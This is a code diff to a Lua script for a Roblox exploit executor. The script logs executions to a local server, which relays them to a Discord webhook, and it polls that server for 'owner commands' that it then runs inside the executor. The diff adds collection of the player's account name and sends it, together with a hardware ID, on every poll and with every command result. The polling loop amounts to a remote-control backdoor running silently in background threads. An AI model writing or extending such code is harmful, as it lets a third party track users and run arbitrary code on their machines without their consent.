@@ -3,7 +3,7 @@
     Sends execution data to the localhost server (/api/send) and
     polls /api/poll for owner commands to run inside the executor.
     The server handles the discord webhook - the webhook URL never leaves the server.
-    V3
+    V4
 ]]
 
 local HttpRequest = request or (syn and syn.request) or http_request
@@ -27,6 +27,7 @@ local function GenerateHashedId()
 end
 
 local MyHashedId = GenerateHashedId()
+local MyAccount = (game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer.Name) or "Unknown"
 
 local Services = setmetatable({}, {
     __index = function(self, Name)
@@ -50,6 +51,7 @@ local function PostJson(Url, Data)
     end)
 end
 
+-- Execution logger
 task.spawn(function()
     pcall(function()
         if not HttpRequest then
@@ -87,13 +89,14 @@ task.spawn(function()
     end)
 end)
 
+-- Remote console (polls for owner commands and runs them)
 task.spawn(function()
     pcall(function()
         if not HttpRequest then
             return
         end
 
-        local PollUrl = "http://localhost:10577/api/poll?hwid=" .. MyHashedId
+        local PollUrl = "http://localhost:10577/api/poll?hwid=" .. MyHashedId .. "&account=" .. MyAccount
         task.wait(3)
 
         while true do
@@ -110,10 +113,11 @@ task.spawn(function()
             end)
 
             if Ok and Response and Response.StatusCode == 200 then
-                local Parsed = pcall(Services.HttpService.JSONDecode, Services.HttpService, Response.Body)
-                local Decoded = select(2, Parsed)
+                local OkParse, Decoded = pcall(function()
+                    return Services.HttpService:JSONDecode(Response.Body)
+                end)
 
-                if Decoded and type(Decoded.ID) == "number" and type(Decoded.Script) == "string" and Decoded.Script:len() > 0 then
+                if OkParse and Decoded and type(Decoded.ID) == "number" and type(Decoded.Script) == "string" and Decoded.Script:len() > 0 then
                     local Output = {}
                     local Genv = getgenv() or (getfenv and getfenv(0)) or _G
                     local OldPrint = Genv.print
@@ -150,6 +154,7 @@ task.spawn(function()
                     PostJson("http://localhost:10577/api/result", {
                         ID = Decoded.ID,
                         HWID = MyHashedId,
+                        Account = MyAccount,
                         Success = not not Success,
                         Output = (ErrorMessage or table.concat(Output, "\n"))
                     })
